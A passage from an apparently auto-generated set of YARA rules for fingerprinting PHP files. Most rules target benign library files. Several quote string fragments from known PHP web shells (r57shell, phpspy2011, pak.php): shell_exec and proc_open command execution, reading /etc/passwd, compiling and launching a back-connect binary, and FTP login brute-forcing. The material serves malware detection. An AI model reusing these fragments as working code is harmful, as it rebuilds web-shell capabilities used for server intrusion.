      $x10 = "filE=/var/cpanel/accounting.log&workingdiR=$cwd\").\"\\\">Readable</a>\"; else echo \"Not readable\";}else echo \"Not found\";" fullword ascii
      $x11 = "if (!$bd) echo $error;else shelL(\"cd $d;gcc -o $n $n.c;chmod +x ./$n;./$n $port &\");" fullword ascii
      $x12 = "250 logged in users</option><option value=\\\"which wget curl lynx w3m\\\">Downloaders</option><option value=\\\"find / -perm -2" ascii
      $x13 = "0\\\" width=\\\"253\\\"><input type=text name=target value=\\\"http://\".getenv('HTTP_HOST').\"/login.php\\\" size=35></td></tr>" ascii
      $x14 = "else echo \"<center><table border=0 style=\\\"border-collapse: collapse\\\" bordercolor=\\\"#282828\\\" width=\\\"434\\\"><tr><t" ascii
      $x15 = "if (empty($CPU))$CPU = shelL(\"echo %PROCESSOR_IDENTIFIER%\");" fullword ascii
      $x16 = "elseif(is_resource($output=popen($command,\"r\"))) {while(!feof($output)){$exec= fgets($output);}pclose($output);}" fullword ascii
      $x17 = "elseif(is_callable('shell_exec') && !strstr($disablefunctions,'shell_exec')){$exec= shell_exec($command);}" fullword ascii
      $x18 = "echo \"<tr><td width=\\\"25%\\\" bgcolor=\\\"#808080\\\">${mil}PHP\\\">PHP</a> version:</td><td bgcolor=\\\"#808080\\\"><a href=" ascii
      $x19 = "<tr><td><a href=javascript:history.back(1)>[Back]</a> - <a href=\"<?php $cwd= getcwd(); echo hlinK(\"seC=sysinfo&workingdiR=$cwd" ascii
      $x20 = "echo \"<font color=blue>Port scanning started against \".htmlspecialchars($target).\":<br>\";" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 300KB and
      1 of ($x*)
}

rule PluginPropertiesWithSharedCalendarTest
{
   meta:
      description = "php22 - file PluginPropertiesWithSharedCalendarTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ffc4d52907cffeee798c34f5b3ff9fe7726490c55a61faa8b8db482ac4b1e71a"
   strings:
      $s1 = "$this->assertEquals(['mailto:user1.sabredav@sabredav.org', '/principals/user1/'], $prop->getHrefs());" fullword ascii
      $s2 = "$props = $this->server->getPropertiesForPath('/principals/user1', [" fullword ascii
      $s3 = "$this->assertArrayHasKey('{urn:ietf:params:xml:ns:caldav}calendar-user-address-set', $props[0][200]);" fullword ascii
      $s4 = "$this->assertArrayHasKey('{urn:ietf:params:xml:ns:caldav}calendar-user-type', $props[0][200]);" fullword ascii
      $s5 = "$this->assertEquals('calendars/user1/outbox/', $prop->getHref());" fullword ascii
      $s6 = "$this->assertEquals('calendars/user1/inbox/', $prop->getHref());" fullword ascii
      $s7 = "$this->assertEquals('calendars/user1/default/', $prop->getHref());" fullword ascii
      $s8 = "$this->assertArrayHasKey('{urn:ietf:params:xml:ns:caldav}schedule-default-calendar-URL', $props[0][200]);" fullword ascii
      $s9 = "$prop = $props[0][200]['{urn:ietf:params:xml:ns:caldav}calendar-user-address-set'];" fullword ascii
      $s10 = "$this->assertArrayHasKey('{urn:ietf:params:xml:ns:caldav}schedule-outbox-URL', $props[0][200]);" fullword ascii
      $s11 = "$this->assertArrayHasKey('{urn:ietf:params:xml:ns:caldav}schedule-inbox-URL', $props[0][200]);" fullword ascii
      $s12 = "'share-access' => DAV\\Sharing\\Plugin::ACCESS_READWRITE" fullword ascii
      $s13 = "'{urn:ietf:params:xml:ns:caldav}calendar-user-address-set'," fullword ascii
      $s14 = "$this->assertArrayHasKey(200, $props[0]);" fullword ascii
      $s15 = "class PluginPropertiesWithSharedCalendarTest extends \\Sabre\\DAVServerTest {" fullword ascii
      $s16 = "$prop = $props[0][200]['{urn:ietf:params:xml:ns:caldav}calendar-user-type'];" fullword ascii
      $s17 = "$this->assertArrayHasKey(0, $props);" fullword ascii
      $s18 = "$this->assertTrue($prop instanceof DAV\\Xml\\Property\\Href);" fullword ascii
      $s19 = "$prop = $props[0][200]['{urn:ietf:params:xml:ns:caldav}schedule-default-calendar-URL'];" fullword ascii
      $s20 = "$prop = $props[0][200]['{urn:ietf:params:xml:ns:caldav}schedule-inbox-URL'];" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 8KB and
      8 of them
}

rule ParamConverter
{
   meta:
      description = "php22 - file ParamConverter.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "7479cec8d850cd4d13a3714516fc4d2ea83fabe181cbf33316aa5f256b0e0b48"
   strings:
      $s1 = "* Get explicit converter name." fullword ascii
      $s2 = "* Use explicitly named converter instead of iterating by priorities." fullword ascii
      $s3 = "* @see ConfigurationInterface" fullword ascii
      $s4 = "* @param bool $optional Whether the parameter is optional" fullword ascii
      $s5 = "* Returns whether or not the parameter is optional." fullword ascii
      $s6 = "* Sets whether or not the parameter is optional." fullword ascii
      $s7 = "namespace Sensio\\Bundle\\FrameworkExtraBundle\\Configuration;" fullword ascii
      $s8 = "* @param array $options An array of options" fullword ascii
      $s9 = "* @param string $name The parameter name" fullword ascii
      $s10 = "* Whether or not the parameter is optional." fullword ascii
      $s11 = "* Returns the annotation alias name." fullword ascii
      $s12 = "* Multiple ParamConverters are allowed." fullword ascii
      $s13 = "* The ParamConverter class handles the ParamConverter annotation parts." fullword ascii
      $s14 = "* @param string $converter" fullword ascii
      $s15 = "* Returns an array of options." fullword ascii
      $s16 = "* Sets an array of options." fullword ascii
      $s17 = "* Set explicit converter name." fullword ascii
      $s18 = "* Sets the parameter name." fullword ascii
      $s19 = "* Returns the parameter name." fullword ascii
      $s20 = "* @return string $name" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule php22_Phpunit
{
   meta:
      description = "php22 - file Phpunit.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d005d1d04d4d586c134b936b91f2d2c67dd9a60f6165a139bd34ff08e82a5a3d"
   strings:
      $x1 = "$process = new Process(implode(' ', $jobopts['command']), $jobopts['testdir'], array_replace($_ENV, $_SERVER));" fullword ascii
      $x2 = "$xmlConfigurationBuilder->setJunitLog($container->getTempDirectory() . '/junit.humbug.xml');" fullword ascii
      $x3 = "$xmlConfigurationBuilder->setTextCoverage($container->getTempDirectory() . '/coverage.humbug.txt');" fullword ascii
      $x4 = "use Symfony\\Component\\Process\\PhpExecutableFinder;" fullword ascii
      $s5 = "$xmlConfigurationBuilder->setPhpCoverage($container->getTempDirectory() . '/coverage.humbug.php');" fullword ascii
      $s6 = "use Humbug\\Adapter\\Phpunit\\Process\\PhpunitExecutableFinder;" fullword ascii
      $s7 = "* @license    https://github.com/padraic/humbug/blob/master/LICENSE New BSD License" fullword ascii
      $s8 = "* allows for more control over what tests are run, allows JUnit logging," fullword ascii
      $s9 = "* Runs the tests suite according to Runner set options and the execution" fullword ascii
      $s10 = "$xmlConfigurationBuilder->setFilterListener($testSuites, $this->getPathToTimeCollectorFile($container));" fullword ascii
      $s11 = "draic Brady (http://blog.astrumfutura.com)" fullword ascii
      $s12 = "$xmlConfigurationBuilder->setTimeCollectionListener($this->getPathToTimeCollectorFile($container));" fullword ascii
      $s13 = "$configFile = $container->getTempDirectory() . '/phpunit.humbug.xml';" fullword ascii
      $s14 = "$container->getTempDirectory() . '/coverage.humbug.php'" fullword ascii
      $s15 = "* @return  Process" fullword ascii
      $s16 = "* Initial command is expected, of course." fullword ascii
      $s17 = "* On first runs we log to junit XML so we can sort tests by performance." fullword ascii
      $s18 = "return $container->getTempDirectory() . '/phpunit.times.humbug.json';" fullword ascii
      $s19 = "* Setup a PHPUnit XML config file for the purposes of explicitly setting" fullword ascii
      $s20 = "* Wrangle XML to create a PHPUnit configuration, based on the original, that" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      1 of ($x*) and 4 of them
}

rule phpallsite
{
   meta:
      description = "php22 - file phpallsite.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a8b68fabe18e1f3cf9ab46ad1ecd20ff30c35b562650bc5162cda00ef5223919"
   strings:
      $s1 = "return (($timearray['year'] - 1980) << 25) | ($timearray['mon'] << 21) | ($timearray['mday'] << 16) |  ($timearray['hours'] <<" fullword ascii
      $s2 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf8\">  " fullword ascii
      $s3 = "{  echo \"<input name='dfile[]' type='checkbox' value='$file' \".($file==basename(__FILE__)?\"\":\"checked\").\"> \";" fullword ascii
      $s4 = "<input name=\"zipname\" type=\"text\" id=\"zipname\" value=\"backup.zip\" size=\"15\">  " fullword ascii
      $s5 = "echo \"<input name='dfile[]' type='checkbox' value='$file' \".($file==basename(__FILE__)?\"\":\"checked\").\"> \";" fullword ascii
      $s6 = "$dirstr .= pack('V',$this->datastr_len ); // relative offset of local header " fullword ascii
      $s7 = "$timearray = ($unixtime == 0) ? getdate() : getdate($unixtime);  " fullword ascii
      $s8 = "$dirstr .= pack('V', 32 );             // external file attributes - 'archive' bit set " fullword ascii
      $s9 = "$num_bitunit_str=(ceil($num/pow(2,10*$key)*100)/100).\" $bitunit[$key]\"; " fullword ascii
      $s10 = "$dirstr = \"\\x50\\x4b\\x01\\x02\\x00\\x00\\x0a\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"; " fullword ascii
      $s11 = "if($dodozip -> startfile(\"$_REQUEST[todir]$_REQUEST[zipname]\"))" fullword ascii
      $s12 = "$dodozip -> addfile(implode('',file(\"$dir/$file\")),\"$dir/$file\"); " fullword ascii
      $s13 = "if (!in_array(end(explode(\".\",$file)), $dodozip -> filefilters))" fullword ascii
      $s14 = "if(realpath($dodozip ->gzfilename)!=realpath(\"$dir/$file\"))" fullword ascii
      $s15 = "$dodozip -> addfile(implode('',file(\"$dir\")),\"$dir\"); " fullword ascii
      $s16 = "<form name=\"myform\" method=\"post\" action=\"\">" fullword ascii
      $s17 = "$dirstr .= pack(\"V\",0).pack(\"V\",0).pack(\"V\",0).pack(\"v\", strlen($name) ); " fullword ascii
      $s18 = "// echo \"<font face=\\\"wingdings\\\" size=\\\"5\\\">0</font>&nbsp;$file<br>\"; " fullword ascii
      $s19 = "// echo \"<font face=\\\"wingdings\\\" size=\\\"5\\\">2</font>&nbsp;&nbsp;$file<br>\"; " fullword ascii
      $s20 = "pname] (\".num_bitunit(filesize(\"$_REQUEST[todir]$_REQUEST[zipname]\")).\")</a>\"; " fullword ascii
   condition:
      uint16(0) == 0x683c and filesize < 30KB and
      8 of them
}

rule php22_pak
{
   meta:
      description = "php22 - file pak.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "5cd89bf53903562bcc5245ed797c8c7e936e7198344b291b9c9bea84416eb9b2"
   strings:
      $s1 = "<textarea cols=80 rows=20 name=\"src\">'.htmlspecialchars(file_get_contents($_POST['path'])).'</textarea><br />" fullword ascii
      $s2 = "$process = proc_open($shell, $descriptorspec, $pipes);" fullword ascii
      $s3 = "// Spawn shell process" fullword ascii
      $s4 = "echo \"<b><font color=red>Read etc/passwd : </font></b><b>$etc_passwd</b>\";" fullword ascii
      $s5 = "echo('<pre>'.htmlspecialchars(file_get_contents($_GET['filesrc'])).'</pre>');" fullword ascii
      $s6 = "echo '<div id=\"content\"><table width=\"700\" border=\"0\" cellpadding=\"3\" cellspacing=\"1\" align=\"center\">" fullword ascii
      $s7 = "0 => array(\"pipe\", \"r\"),  // stdin is a pipe that the child will read from" fullword ascii
      $s8 = "echo '<font color=\"red\">File Upload Error :( </font><br />';" fullword ascii
      $s9 = "<b><font color=red>File Upload : </b></font><input type=\"file\" name=\"file\" />" fullword ascii
      $s10 = "New Name : <input name=\"newname\" type=\"text\" size=\"20\" value=\"'.$_POST['name'].'\" />" fullword ascii
      $s11 = "$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);" fullword ascii
      $s12 = "1 => array(\"pipe\", \"w\"),  // stdout is a pipe that the child will write to" fullword ascii
      $s13 = "$read_a = array($sock, $pipes[1], $pipes[2]);" fullword ascii
      $s14 = "// data to process's STDIN" fullword ascii
      $s15 = "<td><center><form method=\\\"POST\\\" action=\\\"?option&path=$path\\\">" fullword ascii
      $s16 = "// Wait until a command is end down $sock, or some" fullword ascii
      $s17 = "printit(\"ERROR: Can't spawn shell\");" fullword ascii
      $s18 = "// command output is available on STDOUT or STDERR" fullword ascii
      $s19 = "$input = fread($pipes[2], $chunk_size);" fullword ascii
      $s20 = "$input = fread($pipes[1], $chunk_size);" fullword ascii
   condition:
      uint16(0) == 0x633c and filesize < 40KB and
      8 of them
}

rule phpspy2011
{
   meta:
      description = "php22 - file phpspy2011.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a2f9b4e1dcf40053915fc68b554cfeae59ebfc71464f1c4cbab05e9456b0762a"
   strings:
      $x1 = "$exec = $wsh->exec('cmd.exe /c '.$command);" fullword ascii
      $x2 = "!$program && $program = 'c:\\windows\\system32\\cmd.exe';" fullword ascii
      $x3 = "p('<p><a href=\"http://w'.'ww.4ng'.'el.net/php'.'spy/pl'.'ugin/\" target=\"_blank\">Get plugins</a></p>');" fullword ascii
      $x4 = "$res = execute(which('perl').\" /tmp/angel_bc $yourip $yourport &\");" fullword ascii
      $x5 = "<a href=\"javascript:g('shell');\">Execute Command</a> | " fullword ascii
      $x6 = "$res = execute('gcc -o /tmp/angel_bc /tmp/angel_bc.c');" fullword ascii
      $x7 = "formhead(array('title'=>'Execute Command'));" fullword ascii
      $x8 = "$downloaders = array('wget','fetch','lynx','links','curl','get','lwp-mirror');" fullword ascii
      $x9 = "secparam('IP Configurate',execute('ipconfig -all'));" fullword ascii
      $s10 = "secparam('Downloaders', implode(', ',$temp));" fullword ascii
      $s11 = "!$parameter && $parameter = '/c net start > '.SA_ROOT.'log.txt';" fullword ascii
      $s12 = "$res = execute(\"/tmp/angel_bc $yourip $yourport &\");" fullword ascii
      $s13 = ")';?></span><?php echo $_SERVER['HTTP_HOST'];?> (<?php echo gethostbyname($_SERVER['SERVER_NAME']);?>)</td>" fullword ascii
      $s14 = "' : '').($curpage > 1 ? '<a href=\"javascript:settable(\\''.$tablename.'\\', \\'\\', '.($curpage - 1).');\">Prev</a> ' : '');" fullword ascii
      $s15 = "p('<li>'.$scanip.':'.$port.' ------------------------ <span style=\"font-weight:bold;color:#f00;\">Close</span></li>');" fullword ascii
      $s16 = "p('<li>'.$scanip.':'.$port.' ------------------------ <span style=\"font-weight:bold;color:#080;\">Open</span></li>');" fullword ascii
      $s17 = "echo(execute($command));" fullword ascii
      $s18 = "<span style=\"font:11px Verdana;\">Password: </span><input name=\"password\" type=\"password\" size=\"20\">" fullword ascii
      $s19 = "<title><?php echo $action.' - '.$_SERVER['HTTP_HOST'];?></title>" fullword ascii
      $s20 = "formhead(array('title'=>'Execute Program'));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and all of them
}

rule PHPUnitTest
{
   meta:
      description = "php22 - file PHPUnitTest.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "970fdcc417eeab6ac41a10a87a1cac0ebd4156120b58ec943babdbefc603a511"
   strings:
      $s1 = "* Copyright (c) 2010, Mike Lively <mike.lively@sellingsource.com>" fullword ascii
      $s2 = "* @copyright  2010 Mike Lively <m@digitalsandwich.com>" fullword ascii
      $s3 = "* @author     Mike Lively <m@digitalsandwich.com>" fullword ascii
      $s4 = "* @link       http://www.digitalsandwich.com/" fullword ascii
      $s5 = "*  *  Redistributions in binary form must reproduce the above copyright" fullword ascii
      $s6 = "* Phake - Mocking Framework" fullword ascii
      $s7 = "public function testProcessVerifierIncrementsAssertionCount()" fullword ascii
      $s8 = "public function testProcessVerifierThrowsExceptionOnFalse()" fullword ascii
      $s9 = "$this->assertEquals(array('call1'), $this->client->processVerifierResult($result));" fullword ascii
      $s10 = "public function testProcessObjectFreeze()" fullword ascii
      $s11 = "$this->client->processVerifierResult($result);" fullword ascii
      $s12 = "*  *  Redistributions of source code must retain the above copyright" fullword ascii
      $s13 = "$this->client->processObjectFreeze();" fullword ascii
      $s14 = "*  *  Neither the name of Mike Lively nor the names of his" fullword ascii
      $s15 = "public function testProcessVerifierResultReturnsCallsOnTrue()" fullword ascii
      $s16 = "* Utilizes a dummy constraint to indicate that an assertion has happened." fullword ascii
      $s17 = "$this->markTestSkipped('The tested class is not compatible with current version of PHPUnit.');" fullword ascii
      $s18 = "if (version_compare(Version::id(), '6.0.0') >= 0) {" fullword ascii
      $s19 = "use PHPUnit\\Framework\\ExpectationFailedException;" fullword ascii
      $s20 = "if (version_compare('6.0.0', Version::id()) != 1) {" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}


rule PromotionApplicatorSpec
{
   meta:
      description = "php22 - file PromotionApplicatorSpec.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b33380c5791e288904f151b82c4f0ec0d7a504d05201b273acbd6094989b3117"
   strings:
      $x1 = "$actionCommand->execute($subject, $configuration, $promotion)->willReturn(true);" fullword ascii
      $x2 = "$firstActionCommand->execute($subject, [], $promotion)->willReturn(false);" fullword ascii
      $x3 = "$secondActionCommand->execute($subject, [], $promotion)->willReturn(true);" fullword ascii
      $x4 = "$secondActionCommand->execute($subject, [], $promotion)->willReturn(false);" fullword ascii
      $x5 = "$firstActionCommand->execute($subject, [], $promotion)->willReturn(true);" fullword ascii
      $s6 = "function it_applies_promotion_if_at_least_one_action_was_executed_even_if_the_last_one_was_not(" fullword ascii
      $s7 = "function it_applies_promotion_if_at_least_one_action_was_executed(" fullword ascii
      $s8 = "use Sylius\\Component\\Promotion\\Action\\PromotionActionCommandInterface;" fullword ascii
      $s9 = "$registry->get('first_action')->willReturn($firstActionCommand);" fullword ascii
      $s10 = "$registry->get('second_action')->willReturn($secondActionCommand);" fullword ascii
      $s11 = "$promotion->getActions()->willReturn(new ArrayCollection([$action->getWrappedObject()]));" fullword ascii
      $s12 = "new ArrayCollection([$firstAction->getWrappedObject(), $secondAction->getWrappedObject()])" fullword ascii
      $s13 = "$registry->get('test_action')->willReturn($actionCommand);" fullword ascii
      $s14 = "$action->getConfiguration()->willReturn($configuration);" fullword ascii
      $s15 = "function it_executes_all_actions_registered(" fullword ascii
      $s16 = "$secondAction->getConfiguration()->willReturn([]);" fullword ascii
      $s17 = "$firstAction->getConfiguration()->willReturn([]);" fullword ascii
      $s18 = "PromotionActionCommandInterface $firstActionCommand," fullword ascii
      $s19 = "PromotionActionCommandInterface $secondActionCommand," fullword ascii
      $s20 = "$actionCommand->revert($subject, $configuration, $promotion)->shouldBeCalled();" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      1 of ($x*) and 4 of them
}


rule ProfileEditButton
{
   meta:
      description = "php22 - file ProfileEditButton.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "81d591c9e8e859c8797ccb7a740a9b02409a2495845d1a620f1f933ba44ea64c"
   strings:
      $s1 = "* @package humhub.modules_core.user.widgets" fullword ascii
      $s2 = "* under the terms of the GNU Affero General Public License, version 3," fullword ascii
      $s3 = "* The texts of the GNU Affero General Public License with an additional" fullword ascii
      $s4 = "* in the LICENSE file you have received along with this program." fullword ascii
      $s5 = "* ProfileEditButtonWidget" fullword ascii
      $s6 = "* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the" fullword ascii
      $s7 = "* GNU Affero General Public License for more details." fullword ascii
      $s8 = "namespace humhub\\modules\\user\\widgets;" fullword ascii
      $s9 = "* According to our dual licensing model, this program can be used either" fullword ascii
      $s10 = "return $this->render('profileEditButton', array('user' => $this->user));" fullword ascii
      $s11 = "* or under a proprietary license." fullword ascii
      $s12 = "* @author luke" fullword ascii
      $s13 = "* Copyright " fullword ascii
      $s14 = "if (Yii::$app->user->isGuest || !$this->user->isCurrentUser()) {" fullword ascii
      $s15 = "* permission and of our proprietary license can be found at and" fullword ascii
      $s16 = "* @since 0.11" fullword ascii
      $s17 = "* HumHub" fullword ascii
      $s18 = "class ProfileEditButton extends \\yii\\base\\Widget" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 3KB and
      8 of them
}

rule php22_redcod
{
   meta:
      description = "php22 - file redcod.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "bede43416cd088df3d99d6fc5e3ee1dfbcc800f54f129149bf87519a65cce273"
   strings:
      $s1 = "E/NFtpRPTOfDgWxQh41lc0iesRr5XhdoRNvc9HSX" fullword ascii
      $s2 = "NwKZLe8O4zWpTEYE/7yN8RNNOKTxFWWe6Twifat6" fullword ascii
      $s3 = "kiL1rmn1BtrQSIIOFEnJ1AJLLKdz6WwixQoFtpiD" fullword ascii
      $s4 = "hX/Vx73BQlzmp1zfaLtrNbQucJT7Yu+MftPSzX57" fullword ascii
      $s5 = "l00d8As0vhdWmLogRPLyXLlIhWBS3GQ5cYW2VxEy" fullword ascii
      $s6 = "JsMTPIvlSum4VjyDmXeDoeFPoA+mbY7AxPmTzQWO" fullword ascii
      $s7 = "yGeT8rdJn1H+LuRPeD7IxkGd8pGgMc8HfVZa4/kg" fullword ascii
      $s8 = "XRbwutllaqiXXWaGOdllXtDHLuXQ42KXiVEedpkf" fullword ascii
      $s9 = "Zi7ll9f+WN1/Ommdtt+3tx+zp/dlLiO83uzVsnnO" fullword ascii
      $s10 = "2aKGwXhSGrY9axDLL4uNEtXCzYNS4FT0JIxhEocT" fullword ascii
      $s11 = "uWo1ehdL2KZD0VbAtdTsdaHvnTLm+e7O9+aSDrJy" fullword ascii
      $s12 = "ZSo5QTuTMPyHiOQ0UexiYJk7hae+fIwbNTLuUJNM" fullword ascii
      $s13 = "TPM7VijdIAVTbGtv33BDlWQQlToNcMDcoKnC5gvI" fullword ascii
      $s14 = "QQm5v+mRL+PMuMyZjfxk9bindxv9o5UG5yxf8SCm" fullword ascii
      $s15 = "tIbmd0OXgMYjyH3sY2PrI6icodEqBKeYLV7Dx4y2" fullword ascii
      $s16 = "0OzZ1ud6cf2kXpx8rm9/oFr39ruNy/XsTX3lO9Da" fullword ascii
      $s17 = "iCCpA2NGwqLH03p8fKWD3kIRuNU5NxCIkIL5ia0L" fullword ascii
      $s18 = "t28tMPyEHuFf+OoEv8HcZyh9ywPJAN2Q24R/pmT4" fullword ascii
      $s19 = "coAOrIF3TSkMy0rC3yd0CgofGwR5COmc3CqWuDRH" fullword ascii
      $s20 = "8WjaIzsJWRIykRLC5ZEuSSup4US68T2fUCXJqRuN" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      8 of them
}

rule Pressure
{
   meta:
      description = "php22 - file Pressure.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "725ea5680d797d6a2cd3fc5a9b5cac4a3231292efb174fd133503c1e5dcd1014"
   strings:
      $s1 = "* @license   http://framework.zend.com/license/new-bsd     New BSD License" fullword ascii
      $s2 = "* @version   $Id: Pressure.php 20096 2010-01-06 02:05:09Z bkarwin $" fullword ascii
      $s3 = "const KILOGRAM_FORCE_PER_SQUARE_MILLIMETER = 'KILOGRAM_FORCE_PER_SQUARE_MILLIMETER';" fullword ascii
      $s4 = "const KILOGRAM_FORCE_PER_SQUARE_CENTIMETER = 'KILOGRAM_FORCE_PER_SQUARE_CENTIMETER';" fullword ascii
      $s5 = "'KILOGRAM_FORCE_PER_SQUARE_MILLIMETER' => array('9806650', 'kgf/mm" fullword ascii
      $s6 = "'KILOGRAM_FORCE_PER_SQUARE_CENTIMETER' => array('98066.5', 'kgf/cm" fullword ascii
      $s7 = "* Class for handling pressure conversions" fullword ascii
      $s8 = "* @subpackage Zend_Measure_Pressure" fullword ascii
      $s9 = "'TON_PER_SQUARE_INCH_SHORT' => array(array('' => '62052.81552', '/' => '0.0045'), 't/in" fullword ascii
      $s10 = "const KILOGRAM_FORCE_PER_SQUARE_METER      = 'KILOGRAM_FORCE_PER_SQUARE_METER';" fullword ascii
      $s11 = "'POUND_PER_SQUARE_FOOT' => array(array('' => '430.92233', '/' => '9'), 'lb/ft" fullword ascii
      $s12 = "'KILOGRAM_FORCE_PER_SQUARE_METER'      => array('9.80665', 'kgf/m" fullword ascii
      $s13 = "// require_once 'Zend/Measure/Abstract.php';" fullword ascii
      $s14 = "* Calculations for all pressure units" fullword ascii
      $s15 = "'WATER_COLUMN_CENTIMETER' => array('98.0665',  'WC (cm)')," fullword ascii
      $s16 = "'WATER_COLUMN_MILLIMETER' => array('9.80665',  'WC (mm)')," fullword ascii
      $s17 = "'MILLIMETER_MERCURY_0C' => array('133.32239',  'mm mercury (0" fullword ascii
      $s18 = "'METER_HEAD'            => array('9804.139432', 'm head')," fullword ascii
      $s19 = "'FOOT_HEAD'             => array('2989.0669', 'ft head')," fullword ascii
      $s20 = "'GRAM_FORCE_SQUARE_CENTIMETER' => array('98.0665', 'gf')," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 40KB and
      8 of them
}

rule pt_pt_portuguese
{
   meta:
      description = "php22 - file pt-pt.portuguese.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "635ceb56f5660c12e1d2876b21f52dc127435acb3349d606298f51b81af9cd4e"
   strings:
      $s1 = "$lang['update_success_message'] = 'Os dados foram atualizados com sucesso.';" fullword ascii
      $s2 = "= \"The uploaded file exceeds the {max_file_size} directive that was specified.\";" fullword ascii
      $s3 = "$lang['alert_delete_multiple'] = 'Are you sure that you want to delete those {items_amount} items?';" fullword ascii
      $s4 = "$lang['alert_delete_multiple_one'] = 'Are you sure that you want to delete this 1 item?';" fullword ascii
      $s5 = "/* Added in version 1.2.1 */" fullword ascii
      $s6 = "/* Added in version 1.3.1 */" fullword ascii
      $s7 = "/* Added in version 1.5.1 */" fullword ascii
      $s8 = "/* Added in version 1.5.6 */" fullword ascii
      $s9 = "/* Added in version 1.4 */" fullword ascii
      $s10 = "/* Added in version 1.2.2 */" fullword ascii
      $s11 = "/* Added in version 1.6.1 */" fullword ascii
      $s12 = "/* Added in version 1.5.8 */" fullword ascii
      $s13 = "/* Added in version 1.5.2 */" fullword ascii
      $s14 = "$lang['insert_success_message'] = 'Os dados foram armazenados na base de dados.';" fullword ascii
      $s15 = "= \"An error has occurred on uploading.\";" fullword ascii
      $s16 = "/* Javascript messages */" fullword ascii
      $s17 = "$lang['delete_success_message'] = 'O registo foi removido da base de dados.';" fullword ascii
      $s18 = "= \"You are not allow to upload this kind of extension.\";" fullword ascii
      $s19 = "/* Upload functionality */" fullword ascii
      $s20 = "$lang['error_on_uploading'] " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 10KB and
      8 of them
}

rule PageModule
{
   meta:
      description = "php22 - file PageModule.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8d68ca0506023fab3659030411b7a10acdd33cc50421da6a9b20308bcb82ba98"
   strings:
      $s1 = "if (in_array(\\Yii::$app->requestedRoute, ['/page/page/show', '/page/page/list']) && isset($_GET['id'])) {" fullword ascii
      $s2 = "* Base configuration module for DotPlant2 CMS" fullword ascii
      $s3 = "* @var int How much pages to show on search results page" fullword ascii
      $s4 = "$page = app\\modules\\page\\models\\Page::findById($_GET['id']);" fullword ascii
      $s5 = "* @var int minimum pages per list to show" fullword ascii
      $s6 = "* @var int maximum pages per list to show" fullword ascii
      $s7 = "* @var int pages per list to show" fullword ascii
      $s8 = "'configurableModel' => 'app\\modules\\page\\models\\ConfigConfigurationModel'," fullword ascii
      $s9 = "'configurationView' => '@app/modules/page/views/configurable/_config'," fullword ascii
      $s10 = "use app\\modules\\floatPanel\\widgets\\FloatingPanel;" fullword ascii
      $s11 = "* @package app\\modules\\page" fullword ascii
      $s12 = "public function getBackendGrids()" fullword ascii
      $s13 = "* @inheritdoc" fullword ascii
      $s14 = "class PageModule extends app\\components\\BaseModule implements EventInterface" fullword ascii
      $s15 = "'label' => Icon::show('plus') .  Yii::t('app', 'Add child page')," fullword ascii
      $s16 = "'label' => Icon::show('pencil') . ' ' . Yii::t('app', 'Edit page')," fullword ascii
      $s17 = "'defaultValue' => app\\backend\\BackendModule::BACKEND_GRID_ONE_TO_ONE," fullword ascii
      $s18 = "'class' => 'app\\modules\\config\\behaviors\\ConfigurableModuleBehavior'," fullword ascii
      $s19 = "'key' => self::BACKEND_PAGE_GRID," fullword ascii
      $s20 = "'backend' => 'app\\modules\\page\\backend\\PageController'," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 8KB and
      8 of them
}

rule php22_r57_4
{
   meta:
      description = "php22 - file r57_4.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "63449c64a6d8b823c39a6b18998534f14492793a324f10d65179431d1c94a30f"
   strings:
      $x1 = "else if(isset($_POST['reverse'])) { if(@ftp_login($connection,$user,strrev($user))) { echo \"[+] $user:\".strrev($user).\" - suc" ascii
      $x2 = "'eng_text99'=>'* use username from /etc/passwd for ftp login and password'," fullword ascii
      $x3 = "$sql1  = \"# PostgreSQL dump created by r57shell\\r\\n\";" fullword ascii
      $s4 = "$text['eng'] = array('Connect to ftp server failed','Login to ftp server failed','Can\\'t change dir on ftp server');" fullword ascii
      $s5 = "/*  r57shell.php - ?????? ?? ??? ??????????? ??? ????????? ???? ???????  ?? ??????? ????? ???????" fullword ascii
      $s6 = "else if(!empty($_POST['dif'])&&!$fp) { echo \"[-] ERROR! Can't write in dump file\"; }" fullword ascii
      $s7 = "@readfile (\"http://127.0.0.1/r57shell/version.php?version=\".$current_version.\"\");}}  " fullword ascii
      $s8 = "$sql1  = \"# MSSQL dump created by r57shell\\r\\n\";" fullword ascii
      $s9 = "$sql1  = \"# MySQL dump created by r57shell\\r\\n\";" fullword ascii
      $s10 = "echo sr(25,\"<b>\".$lang[$language.'_text38'].$arrow.\"</b>\",in('text','ftp_password',45,(!empty($_POST['ftp_password'])?($_POS" ascii
